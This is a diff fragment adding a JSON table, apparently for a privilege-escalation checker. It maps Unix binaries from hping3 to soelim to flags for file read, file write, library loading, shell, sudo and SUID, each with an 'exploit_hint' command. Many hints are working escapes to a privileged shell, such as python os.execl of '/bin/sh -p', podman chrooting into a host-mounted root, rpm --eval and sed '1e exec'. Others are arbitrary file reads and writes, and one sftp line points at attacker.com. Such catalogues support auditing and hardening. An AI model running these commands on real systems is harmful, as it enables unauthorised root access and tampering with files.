+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "hping3": {
+    "exploit_hint": "hping3",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "iconv": {
+    "exploit_hint": "echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "iftop": {
+    "exploit_hint": "iftop",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ionice": {
+    "exploit_hint": "ionice /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ip": {
+    "exploit_hint": "ip netns add foo",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "iptables-save": {
+    "exploit_hint": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "ispell": {
+    "exploit_hint": "ispell /etc/hosts",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "java": {
+    "exploit_hint": "java Shell",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "jjs": {
+    "exploit_hint": "jjs",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "joe": {
+    "exploit_hint": "joe",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "join": {
+    "exploit_hint": "join -a 2 /dev/null /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "jq": {
+    "exploit_hint": "jq -Rr . /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "jrunscript": {
+    "exploit_hint": "jrunscript -e 'exec(\"/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty\")'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "jshell": {
+    "exploit_hint": "jshell",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "jtag": {
+    "exploit_hint": "jtag --interactive",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "julia": {
+    "exploit_hint": "julia -e 'run(`/bin/sh -p`)'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ksshell": {
+    "exploit_hint": "ksshell -i /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ksu": {
+    "exploit_hint": "ksu -q -e /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "kubectl": {
+    "exploit_hint": "cat >/path/to/temp-file <<EOF",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "last": {
+    "exploit_hint": "last -a -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "latex": {
+    "exploit_hint": "latex --shell-escape '\\immediate\\write18{/bin/sh}'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "latexmk": {
+    "exploit_hint": "latexmk -pdf -pdflatex='/bin/sh #' /dev/null",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "ld.so": {
+    "exploit_hint": "/path/to/ld.so /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ldconfig": {
+    "exploit_hint": "echo /path/to/temp-dir/ >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": true,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "less": {
+    "exploit_hint": "less /etc/hosts",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "lftp": {
+    "exploit_hint": "lftp -c '!/bin/sh'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "links": {
+    "exploit_hint": "links /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "loginctl": {
+    "exploit_hint": "loginctl user-status",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "logrotate": {
+    "exploit_hint": "echo -e '/path/to/temp-file.config {\\nmail x@x.x\\n}' >/path/to/temp-file.config",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "logsave": {
+    "exploit_hint": "logsave /dev/null /bin/sh -i -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "look": {
+    "exploit_hint": "look '' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ltrace": {
+    "exploit_hint": "ltrace -b -L /bin/sh",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "lua": {
+    "exploit_hint": "lua -e 'os.execute(\"/bin/sh\")'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "lwp-download": {
+    "exploit_hint": "echo DATA >/path/to/temp-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "lwp-request": {
+    "exploit_hint": "lwp-request file:///path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "lxd": {
+    "exploit_hint": "lxc init ubuntu:16.04 x -c security.privileged=true",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "m4": {
+    "exploit_hint": "echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "mail": {
+    "exploit_hint": "mail --exec='!/bin/sh'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "make": {
+    "exploit_hint": "make --eval='$(shell /bin/sh 1>&0)' .",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "man": {
+    "exploit_hint": "man '-H/bin/sh #' man",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "mawk": {
+    "exploit_hint": "mawk 'BEGIN {system(\"/bin/sh\")}'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "minicom": {
+    "exploit_hint": "minicom -D /dev/null",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "more": {
+    "exploit_hint": "more /etc/hosts",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "mosh-server": {
+    "exploit_hint": "mosh --server=mosh-server localhost /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "mosquitto": {
+    "exploit_hint": "mosquitto -c /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "msgattrib": {
+    "exploit_hint": "msgattrib -P /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "msgcat": {
+    "exploit_hint": "msgcat -P /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "msgconv": {
+    "exploit_hint": "msgconv -P /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "msgfilter": {
+    "exploit_hint": "echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "msgmerge": {
+    "exploit_hint": "msgmerge -P /path/to/input-file /dev/null",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "msguniq": {
+    "exploit_hint": "msguniq -P /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "mtr": {
+    "exploit_hint": "mtr --raw -F /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "multitime": {
+    "exploit_hint": "multitime /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "mutt": {
+    "exploit_hint": "mutt -F /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "mv": {
+    "exploit_hint": "echo DATA >/path/to/temp-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "mypy": {
+    "exploit_hint": "mypy /path/to/input-file --junit-xml /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "mysql": {
+    "exploit_hint": "mysql -e '\\! /bin/sh'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": true,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "nano": {
+    "exploit_hint": "nano -s '/bin/sh -p'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "nasm": {
+    "exploit_hint": "nasm -@ /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ncdu": {
+    "exploit_hint": "ncdu",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ncftp": {
+    "exploit_hint": "ncftp",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "neofetch": {
+    "exploit_hint": "echo 'exec /bin/sh' >/path/to/temp-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "nft": {
+    "exploit_hint": "nft -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "nginx": {
+    "exploit_hint": "cat >/path/to/temp-file <<EOF",
+    "file_read": false,
+    "file_write": false,
+    "library_load": true,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "nice": {
+    "exploit_hint": "nice /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "nl": {
+    "exploit_hint": "nl -bn -w1 -s '' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "nm": {
+    "exploit_hint": "nm /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "nmap": {
+    "exploit_hint": "nmap --interactive",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "node": {
+    "exploit_hint": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "nohup": {
+    "exploit_hint": "nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "npm": {
+    "exploit_hint": "npm exec /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "nroff": {
+    "exploit_hint": "echo /bin/sh >groff",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "nsenter": {
+    "exploit_hint": "nsenter /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ntpdate": {
+    "exploit_hint": "ntpdate -a x -k /path/to/input-file -d localhost",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "octave": {
+    "exploit_hint": "octave-cli --eval 'system(\"/bin/sh\")'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "od": {
+    "exploit_hint": "od -An -c -w999 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "openssl": {
+    "exploit_hint": "echo DATA | openssl enc -out /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": true,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "openvpn": {
+    "exploit_hint": "openvpn --dev null --script-security 2 --up '/bin/sh -p -s'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "opkg": {
+    "exploit_hint": "rpm opkg install x_1.0_all.deb",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "pandoc": {
+    "exploit_hint": "echo DATA | pandoc -t plain -o /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "paste": {
+    "exploit_hint": "paste /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "pax": {
+    "exploit_hint": "pax -w /path/to/input-file | tar -xO",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "pdflatex": {
+    "exploit_hint": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "pdftex": {
+    "exploit_hint": "pdftex --shell-escape '\\write18{/bin/sh}\\end'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "perf": {
+    "exploit_hint": "perf stat /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "perl": {
+    "exploit_hint": "perl -e 'exec \"/bin/sh\"'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "perlbug": {
+    "exploit_hint": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "pexec": {
+    "exploit_hint": "pexec /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "pg": {
+    "exploit_hint": "pg /etc/hosts",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "php": {
+    "exploit_hint": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "pic": {
+    "exploit_hint": "pic -U",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "pidstat": {
+    "exploit_hint": "pidstat -e /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "pip": {
+    "exploit_hint": "pip config --editor '/bin/sh -s' edit",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "pkexec": {
+    "exploit_hint": "pkexec /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "plymouth": {
+    "exploit_hint": "plymouth ask-for-password --prompt=x --command='/bin/sh -p'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "podman": {
+    "exploit_hint": "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "posh": {
+    "exploit_hint": "posh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "pr": {
+    "exploit_hint": "pr -T /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "psftp": {
+    "exploit_hint": "psftp",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "psql": {
+    "exploit_hint": "psql",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ptx": {
+    "exploit_hint": "ptx -w 999 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "puppet": {
+    "exploit_hint": "puppet apply -e \"exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }\"",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "pwsh": {
+    "exploit_hint": "pwsh",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "pygmentize": {
+    "exploit_hint": "pygmentize -l text /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "pyright": {
+    "exploit_hint": "pyright /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "python": {
+    "exploit_hint": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": true,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "qpdf": {
+    "exploit_hint": "qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "r": {
+    "exploit_hint": "R --no-save -e 'system(\"/bin/sh\")'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rake": {
+    "exploit_hint": "rake -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "ranger": {
+    "exploit_hint": "ranger",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "rc": {
+    "exploit_hint": "rc",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "readelf": {
+    "exploit_hint": "readelf -a @/path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "redcarpet": {
+    "exploit_hint": "redcarpet /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "redis": {
+    "exploit_hint": "redis-cli -h 127.0.0.1",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "restic": {
+    "exploit_hint": "RESTIC_PASSWORD_COMMAND='/bin/sh -p -c \"/bin/sh -p 0<&2 1<&2\"' restic backup",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rev": {
+    "exploit_hint": "rev /path/to/input-file | rev",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "rlwrap": {
+    "exploit_hint": "rlwrap /bin/sh -p",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rpm": {
+    "exploit_hint": "rpm --eval '%(/bin/sh 1>&2)'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rpmdb": {
+    "exploit_hint": "rpmdb --eval '%(/bin/sh 1>&2)'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rpmquery": {
+    "exploit_hint": "rpmquery --eval '%(/bin/sh 1>&2)'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rpmverify": {
+    "exploit_hint": "rpmverify --eval '%(/bin/sh 1>&2)'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rsync": {
+    "exploit_hint": "rsync -e '/bin/sh -p -c \"/bin/sh -p 0<&2 1>&2\"' x:x",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rtorrent": {
+    "exploit_hint": "echo 'execute = /bin/sh,-p,-c,\"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ruby": {
+    "exploit_hint": "ruby -e 'exec \"/bin/sh\"'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": true,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "run-parts": {
+    "exploit_hint": "run-parts --new-session --regex '^sh$' /bin --arg='-p'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "runscript": {
+    "exploit_hint": "echo '! exec /bin/sh' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "rustc": {
+    "exploit_hint": "echo 'fn main() { println!(\"DATA\"); }' >/path/to/temp-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "rustdoc": {
+    "exploit_hint": "echo '//! DATA' >/path/to/temp-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "rustfmt": {
+    "exploit_hint": "rustfmt /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "rustup": {
+    "exploit_hint": "mkdir /path/to/temp-dir/bin/",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "sash": {
+    "exploit_hint": "sash",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "scanmem": {
+    "exploit_hint": "scanmem",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "scp": {
+    "exploit_hint": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "screen": {
+    "exploit_hint": "screen",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "script": {
+    "exploit_hint": "script -q /dev/null",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "scrot": {
+    "exploit_hint": "scrot -e /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "sed": {
+    "exploit_hint": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "service": {
+    "exploit_hint": "service ../../bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "setarch": {
+    "exploit_hint": "setarch -3 /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "setlock": {
+    "exploit_hint": "setlock - /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "sftp": {
+    "exploit_hint": "sftp user@attacker.com",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "sg": {
+    "exploit_hint": "sg $(id -ng)",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "shred": {
+    "exploit_hint": "shred -u /path/to/output-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "shuf": {
+    "exploit_hint": "shuf -e DATA -o /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "slsh": {
+    "exploit_hint": "slsh -e 'system(\"/bin/sh\")'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "smbclient": {
+    "exploit_hint": "smbclient '\\\\host\\share'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "socat": {
+    "exploit_hint": "socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "soelim": {
+    "exploit_hint": "soelim /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
